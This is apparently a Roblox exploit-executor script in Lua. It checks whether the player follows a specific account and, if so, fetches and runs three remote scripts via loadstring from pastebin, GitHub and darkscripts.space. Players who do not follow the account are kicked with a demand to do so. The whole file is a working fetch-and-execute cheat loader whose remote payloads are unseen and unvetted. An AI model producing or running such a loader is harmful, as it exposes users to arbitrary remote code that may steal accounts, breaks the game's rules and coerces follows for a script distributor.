local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Player = Players.LocalPlayer

-- Function to get the list of users the player is following
function GetFollowedUsers()
    local API = "https://friends.roblox.com/v1/users/" .. tostring(Player.UserId) .. "/followings"
    local response = syn.request({ -- Use syn.request for Synapse X or http_request for others
        Url = API,
        Method = "GET"
    })
    if response and response.StatusCode == 200 then
        local data = HttpService:JSONDecode(response.Body)
        return data.data or {}
    else
        return {} -- Return empty table if the request fails
    end
end

-- Function to check if the user follows a specific UserId
function FollowsUser(UserId)
    local FollowedUsers = GetFollowedUsers()
    for _, v in pairs(FollowedUsers) do
        if v.id == UserId then 
            return true 
        end
    end
    return false
end

-- Check if the player follows the required user
local RequiredUserId = 1244024451
if FollowsUser(RequiredUserId) then
    -- Execute the required loadstrings
    loadstring(game:HttpGet("https://pastebin.com/raw/ugAaTUCF"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
    loadstring(game:HttpGet('https://darkscripts.space/scripts/757a1e86-b6c3-4863-ba03-7aa51778638f_1014130817200558080.lua', true))()
else
    -- Kick the player if they don't follow the required user
    Player:Kick("Please follow " .. Players:GetNameFromUserIdAsync(RequiredUserId) .. " to access this script!")
end
